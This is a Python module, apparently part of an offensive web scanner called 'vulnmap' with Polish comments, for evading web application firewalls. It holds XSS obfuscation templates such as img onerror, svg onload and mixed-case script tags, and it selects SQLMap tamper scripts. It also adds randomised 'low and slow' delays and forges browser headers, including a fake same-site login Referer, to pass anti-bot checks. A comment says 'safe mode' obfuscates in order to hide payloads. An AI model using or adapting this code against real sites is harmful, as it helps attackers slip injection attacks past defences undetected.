# /usr/local/share/vulnmap/waf_evasion.py

import random
import time
import urllib.parse
from typing import Dict, List, Optional

import vulnmap_config as config

# --- Baza User-Agentów (Stan na 2024/2025) ---
USER_AGENTS_DB = [
    # Windows / Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    # Windows / Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    # Windows / Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Mac / Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Mac / Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    # Linux / Firefox
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    # Linux / Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# --- Baza Refererów (Symulacja ruchu przychodzącego) ---
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.linkedin.com/"
]

# --- Szablony obfuskacji XSS ---
XSS_OBFUSCATION_TEMPLATES = [
    "<img src=x onerror={payload}>",
    "<svg onload={payload}>",
    "<body onpageshow={payload}>",
    "<ScRipt>{payload}</ScRipt>",
    "&lt;script&gt;{payload}&lt;/script&gt;",
    "javascript:{payload}",
]

def select_sqlmap_tamper_scripts() -> List[str]:
    """
    Wybiera listę skryptów tamper dla SQLMap w zależności od trybu.
    """
    if config.SAFE_MODE:
        # W trybie bezpiecznym używamy agresywnej obfuskacji, żeby ukryć payload
        return config.SQLMAP_TAMPERS_SAFE
    else:
        return config.SQLMAP_TAMPERS_NORMAL

def obfuscate_xss_payload(payload: str = "alert(1)") -> str:
    """Wybiera losowy szablon i wstawia w niego payload XSS."""
    template = random.choice(XSS_OBFUSCATION_TEMPLATES)
    return template.format(payload=payload)

def random_sleep():
    """
    Usypia wątek na losowy czas zdefiniowany w konfiguracji.
    Kluczowe dla 'Low and Slow'.
    """
    if config.SAFE_MODE:
        # Dłuższe czasy dla trybu bezpiecznego
        delay = config.REQUEST_DELAY_SAFE + random.uniform(0.5, 2.0)
    else:
        # Krótsze, ale wciąż losowe opóźnienia
        delay = config.REQUEST_DELAY_NORMAL + random.uniform(0.1, 0.5)
    
    time.sleep(delay)

def get_random_browser_headers(target_url: Optional[str] = None) -> Dict[str, str]:
    """
    Generuje realistyczne nagłówki przeglądarki, w tym Sec-Fetch-*.
    Jeśli podano target_url, czasami ustawia go jako Referer (nawigacja wewnętrzna).
    """
    ua = random.choice(USER_AGENTS_DB)
    
    # Decyzja o Refererze: 
    # 30% szans na brak (bezpośrednie wejście)
    # 40% szans na zewnętrzny (Google itp.)
    # 30% szans na wewnętrzny (jeśli podano target)
    referer = ""
    dice = random.random()
    if dice < 0.3:
        referer = ""
    elif dice < 0.7 or not target_url:
        referer = random.choice(REFERERS)
    else:
        # Parsowanie domeny celu, żeby stworzyć fake referer wewnętrzny
        try:
            parsed = urllib.parse.urlparse(target_url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            referer = f"{base}/login" # Udajemy że przyszliśmy z logowania
        except:
            referer = random.choice(REFERERS)

    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    }

    if referer:
        headers["Referer"] = referer

    # Dodawanie nagłówków Sec-Fetch (Anty-Bot)
    # Dla pełnego realizmu powinniśmy dopasowywać je do UA (Chromium vs Firefox),
    # ale zestaw uniwersalny "navigate" zazwyczaj przechodzi.
    headers.update({
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site" if "google" in referer else "same-origin",
        "Sec-Fetch-User": "?1"
    })

    # Jeśli Chromium, dodaj sec-ch-ua (uproszczone)
    if "Chrome" in ua:
        headers["sec-ch-ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
        headers["sec-ch-ua-mobile"] = "?0"
        headers["sec-ch-ua-platform"] = '"Windows"' if "Windows" in ua else '"Linux"' if "Linux" in ua else '"macOS"'

    return headers
